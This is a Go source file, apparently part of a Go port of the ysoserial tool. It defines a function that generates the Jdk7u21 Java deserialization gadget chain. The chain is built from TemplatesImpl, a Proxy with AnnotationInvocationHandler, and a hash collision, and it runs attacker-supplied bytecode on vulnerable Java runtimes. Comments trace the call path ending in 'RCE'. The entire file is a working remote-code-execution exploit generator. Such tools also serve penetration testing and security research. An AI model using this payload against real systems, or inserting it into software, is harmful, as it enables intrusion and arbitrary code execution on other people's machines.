package ysoserial

// jdk version < 7u25-b03(2013-06-18)
func Jdk7u21(bytecodes []byte) []byte {
	return ClassObject{
		name:             "java.util.LinkedHashSet",
		serialVersionUID: -2851667679971038690,
		classDescFlags:   SC_SERIALIZABLE,
		fields:           []Field{},
		classAnnotations: interfaces(),
		super: &ClassObject{ // HashSet.readObject() -> twice put value
			name:             "java.util.HashSet",
			serialVersionUID: -5024744406713321676,
			classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
			fields:           []Field{},
			classAnnotations: interfaces(),
			super:            nil,
			objectAnnotations: interfaces(
				blockData{0x00, 0x00, 0x00, 0x10, 0x3f, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02},
				// first put
				// hash = hash(key.hashCode())
				// 		= hash(TemplatesImpl.hashCode())
				// HashMap.put() -> HashMap.addEntry()
				ClassObject{
					name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
					serialVersionUID: 673094361519270707,
					classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
					fields: []Field{
						{Integer, "_indentNumber", 0},
						{Integer, "_transletIndex", -1},
						{Boolean, "_useServicesMechanism", false},
						{"Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;", "_auxClasses", nil},
						{"[[B", "_bytecodes", ArrayObject{
							name:             "[[B",
							serialVersionUID: 5475560301672258359,
							classDescFlags:   SC_SERIALIZABLE,
							values: interfaces(
								ArrayObject{
									name:             "[B",
									serialVersionUID: -5984413125824719648,
									classDescFlags:   SC_SERIALIZABLE,
									values:           bytesToInterfaces(bytecodes),
									annotations:      interfaces(),
								},
							),
							annotations: interfaces(),
						},
						},
						{"[Ljava/lang/Class;", "_class", nil},
						{"Ljava/lang/String;", "_name", "Pwnr"},
						{"Ljava/util/Properties;", "_outputProperties", nil},
					},
					classAnnotations: interfaces(),
					super:            nil,
					objectAnnotations: interfaces(
						blockData{0x00},
					),
				},

				// second put
				// hash = hash(key.hashCode())
				// 		= hash(AnnotationInvocationHandler.hashCode())
				// 		= hash(AnnotationInvocationHandler.hashCodeImpl())
				//		= hash(127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()))
				//		= hash(127 * "f5a5a608".hashCode() ^ TemplatesImpl.hashCode())
				//		= hash(127 * 0 ^ TemplatesImpl.hashCode())
				//		= hash(0 ^ TemplatesImpl.hashCode())
				//		= hash(TemplatesImpl.hashCode())
				//
				// HashMap.put() -> key.equals(k) -> HashMap(Proxy).equals(TemplatesImpl) ->
				// AnnotationInvocationHandler.invoke() ->
				// AnnotationInvocationHandler.equalsImpl() ->
				// AnnotationInvocationHandler.getMemberMethods() ->
				// getOutputProperties.Invoke(TemplatesImpl) ->
				// TemplatesImpl.getOutputProperties() -> RCE
				//
				ProxyClassObject{
					name: "java.lang.reflect.Proxy",
					interfaces: []string{
						"javax.xml.transform.Templates",
					},
					serialVersionUID: -2222568056686623797,
					classDescFlags:   SC_SERIALIZABLE,
					fields: []Field{
						{"Ljava/lang/reflect/InvocationHandler;", "h", ClassObject{
							name:             "sun.reflect.annotation.AnnotationInvocationHandler",
							serialVersionUID: 6182022883658399397,
							classDescFlags:   SC_SERIALIZABLE,
							fields: []Field{
								{"Ljava/util/Map;", "memberValues", ClassObject{
									name:             "java.util.HashMap",
									serialVersionUID: 362498820763181265,
									classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
									fields: []Field{
										{Float, "loadFactor", 0.75},
										{Integer, "threshold", 12},
									},
									classAnnotations: interfaces(),
									super:            nil,
									objectAnnotations: interfaces(
										blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
										"f5a5a608",
										ClassObject{
											name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
											serialVersionUID: 673094361519270707,
											classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
											fields: []Field{
												{Integer, "_indentNumber", 0},
												{Integer, "_transletIndex", -1},
												{Boolean, "_useServicesMechanism", false},
												{"Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;", "_auxClasses", nil},
												{"[[B", "_bytecodes", ArrayObject{
													name:             "[[B",
													serialVersionUID: 5475560301672258359,
													classDescFlags:   SC_SERIALIZABLE,
													values: interfaces(
														ArrayObject{
															name:             "[B",
															serialVersionUID: -5984413125824719648,
															classDescFlags:   SC_SERIALIZABLE,
															values:           bytesToInterfaces(bytecodes),
															annotations:      interfaces(),
														},
													),
													annotations: interfaces(),
												},
												},
												{"[Ljava/lang/Class;", "_class", nil},
												{"Ljava/lang/String;", "_name", "Pwnr"},
												{"Ljava/util/Properties;", "_outputProperties", nil},
											},
											classAnnotations: interfaces(),
											super:            nil,
											objectAnnotations: interfaces(
												blockData{0x00},
											),
										},
									),
								},
								},
								{"Ljava/lang/Class;", "type", ClassDesc{
									name:             "javax.xml.transform.Templates",
									serialVersionUID: 0,
									classDescFlags:   0x00,
								},
								},
							},
							classAnnotations:  interfaces(),
							super:             nil,
							objectAnnotations: interfaces(),
						},
						},
					},
				},
			),
		},
		objectAnnotations: interfaces(),
	}.SerializeWithMagicHeader()
}
